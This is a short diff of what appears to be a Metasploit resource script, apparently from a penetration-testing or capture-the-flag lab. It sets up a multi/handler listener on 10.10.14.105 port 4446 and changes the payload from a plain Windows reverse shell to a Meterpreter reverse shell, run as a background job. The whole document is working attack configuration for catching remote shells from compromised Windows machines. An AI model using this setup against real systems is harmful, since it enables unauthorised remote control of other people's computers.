@@ -1,6 +1,5 @@
 use exploit/multi/handler
-set PAYLOAD windows/shell/reverse_tcp
-set LHOST 10.10.14.105
-set LPORT 4446
-set ExitOnSession false
+set payload windows/meterpreter/reverse_tcp
+set lhost 10.10.14.105
+set lport 4446
 exploit -j -z
